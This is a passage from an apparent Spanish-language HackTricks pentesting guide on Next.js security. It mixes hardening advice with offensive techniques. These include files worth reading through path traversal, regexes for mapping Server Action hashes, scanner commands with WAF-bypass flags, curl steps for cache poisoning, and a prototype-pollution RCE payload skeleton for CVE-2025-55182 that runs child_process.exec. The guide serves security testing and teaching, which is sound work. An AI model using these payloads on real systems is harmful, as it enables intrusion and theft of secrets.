- **Nunca expongas secretos en el cliente:** Asegúrate de que las variables sensibles se usen únicamente del lado del servidor.

**Ejemplo:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Nota:** Para restringir variables solo al lado del servidor, omítelas del objeto `env` o préfixalas con `NEXT_PUBLIC_` para exponerlas al cliente.

### Artefactos del servidor útiles para apuntar vía LFI/download endpoints

Si encuentras un path traversal o una download API en una app Next.js, dirige tu atención a los artefactos compilados que leak secretos del lado del servidor y la lógica de autenticación:

- `.env` / `.env.local` para secretos de sesión y credenciales de proveedores.
- `.next/routes-manifest.json` y `.next/build-manifest.json` para una lista completa de rutas.
- `.next/server/pages/api/auth/[...nextauth].js` para recuperar la configuración compilada de NextAuth (a menudo contiene contraseñas de reserva cuando los valores de `process.env` no están definidos).
- `next.config.js` / `next.config.mjs` para revisar reescrituras, redireccionamientos y el enrutamiento del middleware.

### Autenticación y Autorización

**Enfoque:**

- **Session-Based Authentication:** Usa cookies para gestionar las sesiones de usuario.
- **Token-Based Authentication:** Implementa JWTs para autenticación sin estado.
- **Third-Party Providers:** Integra con proveedores OAuth (p. ej., Google, GitHub) usando librerías como `next-auth`.

**Buenas prácticas de seguridad:**

- **Secure Cookies:** Establece los atributos `HttpOnly`, `Secure` y `SameSite`.
- **Password Hashing:** Siempre hashea las contraseñas antes de almacenarlas.
- **Input Validation:** Previene ataques de inyección validando y saneando las entradas.

**Ejemplo:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Optimización del rendimiento

**Estrategias:**

- **Optimización de imágenes:** Usa el componente `next/image` de Next.js para la optimización automática de imágenes.
- **División de código:** Aprovecha los imports dinámicos para dividir el código y reducir los tiempos de carga inicial.
- **Caché:** Implementa estrategias de caché para las respuestas de API y los recursos estáticos.
- **Carga diferida:** Carga componentes o recursos solo cuando sean necesarios.

**Ejemplo:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeración (hash to function name via source maps)

Next.js moderno usa “Server Actions” que se ejecutan en el servidor pero se invocan desde el cliente. En producción estas invocaciones son opacas: todos los POSTs llegan a un endpoint común y se distinguen por un hash específico de la build enviado en la cabecera `Next-Action`. Ejemplo:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Cuando `productionBrowserSourceMaps` está habilitado, los chunks JS minificados contienen llamadas a `createServerReference(...)` que leak suficiente estructura (más los source maps asociados) para recuperar un mapeo entre el hash de la acción y el nombre original de la función. Esto te permite traducir hashes observados en `Next-Action` a objetivos concretos como `deleteUserAccount()` o `exportFinancialData()`.

### Enfoque de extracción (regex on minified JS + optional source maps)

Busca en los chunks JS descargados `createServerReference` y extrae el hash y el símbolo de la función/fuente. Dos patrones útiles:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Grupo 1: hash de server action (40+ hex chars)
- Grupo 2: símbolo o ruta que puede resolverse al nombre de la función original vía el source map cuando esté presente

Si el script anuncia un source map (comentario final `//# sourceMappingURL=<...>.map`), descárgalo y resuelve el símbolo/ruta al nombre de la función original.

### Flujo de trabajo práctico

- Descubrimiento pasivo mientras navegas: captura solicitudes con cabeceras `Next-Action` y URLs de chunks JS.
- Obtén los bundles JS referenciados y los archivos `*.map` adjuntos (cuando estén presentes).
- Ejecuta la regex anterior para construir un diccionario hash↔name.
- Usa el diccionario para dirigir tus pruebas:
  - Triage basado en nombres (p. ej., `transferFunds`, `exportFinancialData`).
  - Rastrea la cobertura entre builds por nombre de función (los hashes rotan entre builds).

### Ejercitando acciones ocultas (solicitud basada en plantilla)

Toma un POST válido observado en el proxy como plantilla y cambia el valor `Next-Action` para apuntar a otra acción descubierta:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Reproduce en Repeater y prueba la autorización, la validación de entradas y la lógica de negocio de acciones que de otro modo serían inalcanzables.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) automatiza lo anterior en Burp:
- Minería del historial del proxy para JS chunks, extrae entradas `createServerReference(...)` y analiza source maps cuando están disponibles.
- Mantiene un diccionario buscable hash↔function-name y desduplica entre builds por nombre de función.
- Puede localizar un POST de plantilla válido y abrir una pestaña Repeater lista para enviar con el hash de la acción objetivo reemplazado.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Requiere `productionBrowserSourceMaps` habilitado en producción para recuperar nombres de bundles/source maps.
- La divulgación de function-name no es una vulnerabilidad por sí misma; úsala para guiar el descubrimiento y probar la autorización de cada acción.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Las implementaciones de Next.js App Router que exponen Server Actions en `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** contienen una grave prototype pollution del lado del servidor durante la deserialización de chunks **Flight**. Al crear referencias `$` dentro de una payload de Flight, un atacante puede pivotar desde prototipos contaminados a ejecución arbitraria de JavaScript y luego a ejecución de comandos OS dentro del proceso Node.js.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Attack chain in Flight chunks

1. **Prototype pollution primitive:** Establece `"then": "$1:__proto__:then"` para que el resolver escriba una función `then` en `Object.prototype`. Cualquier objeto simple procesado posteriormente se convierte en un thenable, permitiendo al atacante influir en el flujo de control async dentro de las internals de RSC.
2. **Rebinding to the global `Function` constructor:** Apunta `_response._formData.get` a `"$1:constructor:constructor"`. Durante la resolución, `object.constructor` → `Object`, y `Object.constructor` → `Function`, por lo que llamadas futuras a `_formData.get()` en realidad ejecutan `Function(...)`.
3. **Code execution via `_prefix`:** Coloca código JavaScript en `_response._prefix`. Cuando se invoca el `_formData.get` contaminado, el framework evalúa `Function(_prefix)(...)`, de modo que el JS inyectado puede ejecutar `require('child_process').exec()` o cualquier otro primitivo de Node.

#### Payload skeleton
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Mapeo de la exposición de React Server Function

React Server Functions (RSF) son funciones que incluyen la directiva `'use server';`. Cada form action, mutation o fetch helper vinculado a una de esas funciones se convierte en un endpoint RSC Flight que deserializará sin problemas attacker-supplied payloads. Pasos de reconocimiento útiles derivados de las evaluaciones de React2Shell:

- **Inventario estático:** busca la directiva para entender cuántos RSFs están siendo expuestos automáticamente por el framework.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router predeterminado:** `create-next-app` habilita el App Router + el directorio `app/` por defecto, lo que transforma silenciosamente cada ruta en un endpoint compatible con RSC. Recursos del App Router como `/_next/static/chunks/app/` o respuestas que transmiten Flight chunks vía `text/x-component` son huellas fuertes expuestas a Internet.
- **Implementaciones RSC implícitamente vulnerables:** El propio aviso de React señala que las apps que incluyen el runtime RSC pueden ser explotables **incluso sin RSFs explícitos**, por lo que trate cualquier build que use `react-server-dom-*` 19.0.0–19.2.0 como sospechosa.
- **Otros frameworks que incluyen RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. reutilizan el mismo serializer y heredan la misma superficie remota de ataque hasta que incorporen builds de React parcheadas.

#### Cobertura de versiones (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulnerable** en 19.0.0, 19.1.0–19.1.1 y 19.2.0; **patched** en 19.0.1, 19.1.2 y 19.2.1 respectivamente.
- **Next.js stable:** Las releases del App Router 15.0.0–16.0.6 incluyen la pila RSC vulnerable. Las trains de parches 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 incluyen dependencias corregidas, así que cualquier build por debajo de esas versiones es de alto valor.
- **Next.js canary:** `14.3.0-canary.77+` también distribuye el runtime defectuoso y actualmente carece de canary drops parcheados, lo que convierte esas huellas en candidatos sólidos para explotación.

#### Oráculo de detección remota

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) envía una Flight request multipart construida a rutas candidatas y observa el comportamiento del servidor:

- **Modo por defecto** ejecuta una carga útil RCE determinista (operación matemática reflejada vía `X-Action-Redirect`) demostrando ejecución de código.
- **`--safe-check` mode** malforma a propósito el mensaje Flight para que servidores parcheados devuelvan `200/400`, mientras que objetivos vulnerables emiten respuestas `HTTP/500` que contienen la subcadena `E{"digest"` dentro del cuerpo. Ese par `(500 + digest)` es actualmente el oráculo remoto más fiable publicado por defensores.
- Los switches integrados `--waf-bypass`, `--vercel-waf-bypass` y `--windows` ajustan el layout de la carga, anteponen junk o intercambian comandos del SO para que puedas sondear activos reales en Internet.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Otros problemas recientes de App Router (finales de 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – payloads Flight malformados pueden hacer que el resolver RSC entre en un bucle infinito (DoS pre-auth) o forzar la serialización del código compilado de Server Function para otras acciones. Las builds de App Router ≥13.3 están afectadas hasta que se parcheen; 15.0.x–16.0.x necesitan las líneas de parche específicas del upstream advisory. Reutiliza la ruta normal de Server Action pero transmite un cuerpo `text/x-component` con referencias abusivas `$`. Detrás de una CDN la conexión colgada se mantiene abierta por timeouts de caché, haciendo el DoS barato.
- **Consejo de triage:** Objetivos sin parchear devuelven `500` con `E{"digest"` tras payloads Flight malformados; las builds parcheadas devuelven `400/200`. Prueba cualquier endpoint que ya esté transmitiendo Flight chunks (busca cabeceras `Next-Action` o respuestas `text/x-component`) y reprodúcelo con una carga útil modificada.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – la ausencia de `Vary` permitió que una respuesta con `Accept: text/x-component` se cacheara y se sirviera a navegadores que esperan HTML. Una sola petición de priming puede reemplazar la página con payloads RSC en bruto. Flujo PoC:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
Si la segunda respuesta devuelve datos JSON Flight en lugar de HTML, la ruta es susceptible a envenenamiento de caché. Purga la caché después de las pruebas.

## Referencias

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
